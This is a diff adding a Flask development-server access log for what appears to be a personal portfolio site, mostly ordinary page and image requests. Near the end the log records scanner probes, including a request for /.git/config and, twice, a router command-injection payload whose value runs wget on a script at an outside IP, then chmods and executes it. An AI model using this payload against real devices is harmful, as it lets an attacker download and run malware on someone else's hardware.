@@ -1,0 +1,71 @@
+MongoDB is installed and running.
+MongoDB client created successfully.
+MongoDB is installed and running.
+MongoDB client created successfully.
+ * Debug mode: off
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:5000
+ * Running on http://172.31.17.119:5000
+Press CTRL+C to quit
+127.0.0.1 - - [03/Apr/2024 17:30:30] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [03/Apr/2024 17:30:30] "GET /static/styles.css HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:30] "GET /static/images/profile/profile-pic.jpg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:30] "GET /static/images/tech/system-design.png HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:30] "GET /static/images/icons/kaggle.svg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:30] "GET /static/images/icons/leetcode.svg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:30] "GET /static/images/tech/dynamic-programming.jpg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:30] "GET /static/images/icons/gitlab.svg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:30] "GET /static/images/misc/cards.jpg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:30] "GET /static/images/projects/patching-unpatching/patching.png HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:30] "GET /static/images/icons/linkedin.svg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:30] "GET /static/images/icons/github.svg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:30] "GET /static/images/projects/federated-learning/federated-learning-flow.png HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:30] "GET /static/images/projects/neural-transfer/image_1.png HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:36] "GET /tech/system-design HTTP/1.0" 200 -
+127.0.0.1 - - [03/Apr/2024 17:30:36] "GET /static/styles.css HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:36] "GET /static/images/misc/cards.jpg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:36] "GET /static/images/tech/system-design.png HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:38] "GET / HTTP/1.0" 200 -
+127.0.0.1 - - [03/Apr/2024 17:30:38] "GET /static/images/profile/profile-pic.jpg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:38] "GET /static/styles.css HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:38] "GET /static/images/tech/dynamic-programming.jpg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:38] "GET /static/images/projects/patching-unpatching/patching.png HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:38] "GET /static/images/misc/cards.jpg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:38] "GET /static/images/tech/system-design.png HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:38] "GET /static/images/icons/linkedin.svg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:38] "GET /static/images/icons/github.svg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:38] "GET /static/images/projects/federated-learning/federated-learning-flow.png HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:38] "GET /static/images/projects/neural-transfer/image_1.png HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:38] "GET /static/images/icons/leetcode.svg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:38] "GET /static/images/icons/kaggle.svg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:38] "GET /static/images/icons/gitlab.svg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:41] "GET /tech HTTP/1.0" 200 -
+127.0.0.1 - - [03/Apr/2024 17:30:41] "GET /static/styles.css HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:41] "GET /static/images/tech/system-design.png HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:41] "GET /static/images/tech/dynamic-programming.jpg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:30:41] "GET /static/images/misc/cards.jpg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:04] "GET /project HTTP/1.0" 200 -
+127.0.0.1 - - [03/Apr/2024 17:31:04] "GET /static/styles.css HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:04] "GET /static/images/projects/patching-unpatching/patching.png HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:04] "GET /static/images/projects/federated-learning/federated-learning-flow.png HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:04] "GET /static/images/projects/neural-transfer/image_1.png HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:04] "GET /static/images/misc/cards.jpg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:06] "GET /about HTTP/1.0" 200 -
+127.0.0.1 - - [03/Apr/2024 17:31:06] "GET /static/images/profile/profile-pic.jpg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:06] "GET /static/styles.css HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:06] "GET /static/images/projects/federated-learning/federated-learning-flow.png HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:06] "GET /static/images/projects/patching-unpatching/patching.png HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:06] "GET /static/images/projects/neural-transfer/image_1.png HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:06] "GET /static/images/tech/system-design.png HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:06] "GET /static/images/icons/linkedin.svg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:06] "GET /static/images/icons/github.svg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:06] "GET /static/images/icons/gitlab.svg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:06] "GET /static/images/icons/leetcode.svg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:07] "GET /static/images/tech/dynamic-programming.jpg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:07] "GET /static/images/misc/cards.jpg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:31:07] "GET /static/images/icons/kaggle.svg HTTP/1.0" 304 -
+127.0.0.1 - - [03/Apr/2024 17:36:12] "GET /.git/config HTTP/1.0" 404 -
+127.0.0.1 - - [03/Apr/2024 17:37:03] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd%20/tmp;%20wget%20http://94.156.8.244/tenda.sh;%20chmod%20777%20tenda.sh;%20./tenda.sh) HTTP/1.0" 404 -
+127.0.0.1 - - [03/Apr/2024 17:37:03] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cd%20/tmp;%20wget%20http://94.156.8.244/tenda.sh;%20chmod%20777%20tenda.sh;%20./tenda.sh) HTTP/1.0" 404 -
+127.0.0.1 - - [03/Apr/2024 17:40:02] "HEAD /Core/Skin/Login.aspx HTTP/1.0" 404 -
